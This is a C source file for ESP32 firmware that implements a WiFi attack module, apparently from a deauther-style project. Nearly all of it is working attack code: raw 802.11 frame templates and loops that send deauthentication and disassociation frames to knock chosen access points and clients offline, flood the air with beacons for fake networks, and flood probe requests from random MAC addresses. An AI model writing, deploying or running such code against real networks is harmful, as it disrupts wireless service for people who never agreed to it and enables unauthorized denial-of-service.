/**
 * Attack Module Implementation
 * Deauthentication, Beacon Flood, Probe Request Flood
 */
#include "attack.h"
#include "wifi_ctl.h"
#include "config.h"

#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_timer.h"

static const char* TAG = "attack";

// ===== Packet templates ===== //

static uint8_t deauth_frame[] = {
    /* 0-1  */ 0xC0, 0x00,                         // type: deauth
    /* 2-3  */ 0x00, 0x00,                         // duration
    /* 4-9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (target)
    /* 10-15*/ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (AP)
    /* 16-21*/ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP)
    /* 22-23*/ 0x00, 0x00,                         // seq num
    /* 24-25*/ 0x01, 0x00                          // reason code
};

static uint8_t beacon_frame[] = {
    /* 0-3  */ 0x80, 0x00, 0x00, 0x00,             // beacon
    /* 4-9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // dest: broadcast
    /* 10-15*/ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // source
    /* 16-21*/ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID
    /* 22-23*/ 0x00, 0x00,                         // seq
    /* 24-31*/ 0x83, 0x51, 0xF7, 0x8F, 0x0F, 0x00, 0x00, 0x00, // timestamp
    /* 32-33*/ 0x64, 0x00,                         // interval: 100ms
    /* 34-35*/ 0x31, 0x00,                         // capabilities
    // SSID tag
    /* 36   */ 0x00,                               // tag: SSID
    /* 37   */ 0x00,                               // SSID length (filled in)
    // SSID bytes follow (max 32)
    // Then supported rates, channel, RSN...
};

static const uint8_t beacon_rates[] = {
    0x01, 0x08,       // supported rates tag
    0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
    0x03, 0x01, 0x01, // DS channel (filled in)
};

static const uint8_t beacon_rsn_wpa2[] = {
    0x30, 0x18, 0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x02,
    0x02, 0x00,
    0x00, 0x0F, 0xAC, 0x04,
    0x00, 0x0F, 0xAC, 0x04,
    0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x02,
    0x00, 0x00,
};

static uint8_t probe_frame[] = {
    /* 0-1  */ 0x40, 0x00,                         // probe request
    /* 2-3  */ 0x00, 0x00,                         // duration
    /* 4-9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // dest: broadcast
    /* 10-15*/ 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // source (random)
    /* 16-21*/ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID: broadcast
    /* 22-23*/ 0x00, 0x00,                         // seq
    // SSID tag
    /* 24   */ 0x00,                               // tag: SSID
    /* 25   */ 0x00,                               // length (filled in)
    // SSID bytes follow
};

static const uint8_t probe_rates[] = {
    0x01, 0x08,
    0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
};

// ===== Internal state ===== //
static volatile bool s_running = false;
static uint8_t       s_active_types = 0;
static uint32_t      s_deauth_sent = 0;
static uint32_t      s_beacon_sent = 0;
static uint32_t      s_probe_sent = 0;
static uint32_t      s_pkt_counter = 0;
static uint32_t      s_pps = 0;
static int64_t       s_last_pps_time = 0;
static int64_t       s_start_time = 0;

// ===== Deauth attack ===== //
static void send_deauth(const uint8_t* ap_mac, const uint8_t* st_mac,
                         uint8_t reason, uint8_t channel) {
    uint8_t pkt[sizeof(deauth_frame)];
    memcpy(pkt, deauth_frame, sizeof(pkt));

    // receiver = station, source = AP, bssid = AP
    memcpy(&pkt[4],  st_mac, 6);
    memcpy(&pkt[10], ap_mac, 6);
    memcpy(&pkt[16], ap_mac, 6);
    pkt[24] = reason;

    wifi_set_channel(channel);

    // Deauth frame (0xC0)
    pkt[0] = 0xC0;
    if (wifi_send_raw(pkt, sizeof(pkt))) { s_deauth_sent++; s_pkt_counter++; }

    // Disassociate frame (0xA0)
    pkt[0] = 0xA0;
    if (wifi_send_raw(pkt, sizeof(pkt))) { s_deauth_sent++; s_pkt_counter++; }

    // Reverse direction: station -> AP (only for unicast)
    bool is_broadcast = true;
    for (int i = 0; i < 6; i++) { if (st_mac[i] != 0xFF) { is_broadcast = false; break; } }

    if (!is_broadcast) {
        memcpy(&pkt[4],  ap_mac, 6);
        memcpy(&pkt[10], st_mac, 6);
        memcpy(&pkt[16], st_mac, 6);

        pkt[0] = 0xC0;
        if (wifi_send_raw(pkt, sizeof(pkt))) { s_deauth_sent++; s_pkt_counter++; }

        pkt[0] = 0xA0;
        if (wifi_send_raw(pkt, sizeof(pkt))) { s_deauth_sent++; s_pkt_counter++; }
    }
}

static void deauth_update(void) {
    const uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t reason = DEAUTH_REASON_CODE;
    int deauths_sent_this_round = 0;

    // Deauth selected APs (broadcast to all clients)
    int ap_count = wifi_get_ap_count();
    for (int i = 0; i < ap_count && deauths_sent_this_round < DEAUTHS_PER_TARGET * 3; i++) {
        ap_info_t* ap = wifi_get_ap(i);
        if (ap && ap->selected) {
            for (int d = 0; d < DEAUTHS_PER_TARGET; d++) {
                send_deauth(ap->bssid, broadcast_mac, reason, ap->channel);
                deauths_sent_this_round++;
            }
        }
    }

    // Deauth selected stations (targeted)
    int st_count = wifi_get_station_count();
    for (int i = 0; i < st_count && deauths_sent_this_round < DEAUTHS_PER_TARGET * 6; i++) {
        station_info_t* st = wifi_get_station(i);
        if (st && st->selected) {
            for (int d = 0; d < DEAUTHS_PER_TARGET; d++) {
                send_deauth(st->ap_bssid, st->mac, reason, st->channel);
                deauths_sent_this_round++;
            }
        }
    }
}

// ===== Beacon flood ===== //
static void send_beacon(const uint8_t* mac, const char* ssid,
                          uint8_t channel, bool wpa2) {
    int ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;

    // Build packet: header(38) + ssid(ssid_len) + rates(13) + [rsn(26)]
    int rsn_len = wpa2 ? sizeof(beacon_rsn_wpa2) : 0;
    int total = 38 + ssid_len + sizeof(beacon_rates) + rsn_len;
    uint8_t pkt[200];
    if (total > (int)sizeof(pkt)) return;

    // Copy header
    memcpy(pkt, beacon_frame, 38);

    // Set MACs
    memcpy(&pkt[10], mac, 6);
    memcpy(&pkt[16], mac, 6);

    // Set capabilities for WPA2
    pkt[34] = wpa2 ? 0x31 : 0x21;

    // Set SSID
    pkt[37] = ssid_len;
    memcpy(&pkt[38], ssid, ssid_len);

    // Copy rates
    int offset = 38 + ssid_len;
    memcpy(&pkt[offset], beacon_rates, sizeof(beacon_rates));
    pkt[offset + sizeof(beacon_rates) - 1] = channel; // DS channel

    offset += sizeof(beacon_rates);

    // Copy RSN if WPA2
    if (wpa2) {
        memcpy(&pkt[offset], beacon_rsn_wpa2, sizeof(beacon_rsn_wpa2));
        offset += sizeof(beacon_rsn_wpa2);
    }

    wifi_set_channel(channel);
    if (wifi_send_raw(pkt, offset)) { s_beacon_sent++; s_pkt_counter++; }
}

static void beacon_update(void) {
    int count = ssid_list_count();
    if (count == 0) return;

    uint8_t mac[6];
    for (int i = 0; i < count; i++) {
        ssid_entry_t* entry = ssid_list_get(i);
        if (!entry) continue;

        random_mac(mac);
        mac[5] = i; // unique per SSID

        uint8_t ch = (i % WIFI_CHANNEL_MAX) + 1;
        send_beacon(mac, entry->ssid, ch, entry->wpa2);
    }
}

// ===== Probe flood ===== //
static void send_probe(const uint8_t* mac, const char* ssid, uint8_t channel) {
    int ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;

    int total = 26 + ssid_len + sizeof(probe_rates);
    uint8_t pkt[128];
    if (total > (int)sizeof(pkt)) return;

    memcpy(pkt, probe_frame, 26);
    memcpy(&pkt[10], mac, 6);

    pkt[25] = ssid_len;
    memcpy(&pkt[26], ssid, ssid_len);

    int offset = 26 + ssid_len;
    memcpy(&pkt[offset], probe_rates, sizeof(probe_rates));
    offset += sizeof(probe_rates);

    wifi_set_channel(channel);
    if (wifi_send_raw(pkt, offset)) { s_probe_sent++; s_pkt_counter++; }
}

static void probe_update(void) {
    int count = ssid_list_count();
    if (count == 0) return;

    uint8_t mac[6];
    for (int i = 0; i < count; i++) {
        ssid_entry_t* entry = ssid_list_get(i);
        if (!entry) continue;

        random_mac(mac);
        uint8_t ch = (i % WIFI_CHANNEL_MAX) + 1;

        for (int p = 0; p < PROBE_FRAMES_PER_SSID; p++) {
            send_probe(mac, entry->ssid, ch);
        }
    }
}

// ===== Public API ===== //
void attack_init(void) {
    s_running = false;
    s_active_types = 0;
    s_deauth_sent = 0;
    s_beacon_sent = 0;
    s_probe_sent = 0;
    s_pkt_counter = 0;
    s_pps = 0;
}

void attack_start(uint8_t types) {
    s_active_types = types;
    s_deauth_sent = 0;
    s_beacon_sent = 0;
    s_probe_sent = 0;
    s_pkt_counter = 0;
    s_pps = 0;
    s_last_pps_time = esp_timer_get_time();
    s_start_time = esp_timer_get_time();
    s_running = true;
    ESP_LOGI(TAG, "Attack started (types=0x%02X)", types);
}

void attack_stop(void) {
    if (s_running) {
        s_running = false;
        s_active_types = 0;
        ESP_LOGI(TAG, "Attack stopped");
    }
}

bool attack_is_running(void) { return s_running; }

attack_status_t attack_get_status(void) {
    attack_status_t st = {
        .deauth_sent = s_deauth_sent,
        .beacon_sent = s_beacon_sent,
        .probe_sent  = s_probe_sent,
        .packets_per_sec = s_pps,
        .running = s_running,
        .active_types = s_active_types,
    };
    return st;
}

void attack_update(void) {
    if (!s_running) return;

    // Check timeout
    int64_t now = esp_timer_get_time();
    if (ATTACK_TIMEOUT_S > 0 &&
        (now - s_start_time) > (int64_t)ATTACK_TIMEOUT_S * 1000000LL) {
        ESP_LOGI(TAG, "Attack timeout");
        attack_stop();
        return;
    }

    // Run active attacks
    if (s_active_types & ATTACK_DEAUTH) deauth_update();
    if (s_active_types & ATTACK_BEACON) beacon_update();
    if (s_active_types & ATTACK_PROBE)  probe_update();

    // Update PPS every second
    if ((now - s_last_pps_time) >= 1000000LL) {
        s_pps = s_pkt_counter;
        s_pkt_counter = 0;
        s_last_pps_time = now;
    }
}
